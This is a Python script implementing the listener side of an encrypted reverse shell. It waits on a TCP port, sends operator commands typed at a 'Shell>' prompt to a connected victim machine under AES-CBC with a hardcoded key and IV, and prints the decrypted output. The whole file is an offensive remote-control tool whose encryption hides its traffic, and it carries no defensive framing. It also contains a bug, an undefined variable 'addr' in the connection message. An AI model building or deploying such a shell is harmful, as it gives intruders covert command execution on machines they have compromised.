#coding=utf-8

import socket, argparse

from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"I" * 16 # 16 字节 初始变量
key = b"K" * 32  # 32 字节（256 bit）密钥

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect(host, port):

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind((host, port))
    s.listen(1)
    print('listen at ', s.getsockname())
    conn, address = s.accept()
    print ('[+] Got a connection from', addr)
    while True:

        command = input("Shell> ")
        if 'quit' in command:
            conn.send(encrypt(b'quit'))
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            print(decrypt(conn.recv(10240)).decode('utf-8'))
def main():
    parser = argparse.ArgumentParser(description='Python3 AES Reverse Shell')
    parser.add_argument('host', help=' interface the server listens at;')
    parser.add_argument('port', type=int, default=4444, help='tcp port')
    args = parser.parse_args()
    if args.host:
        connect(args.host, args.port)

main()
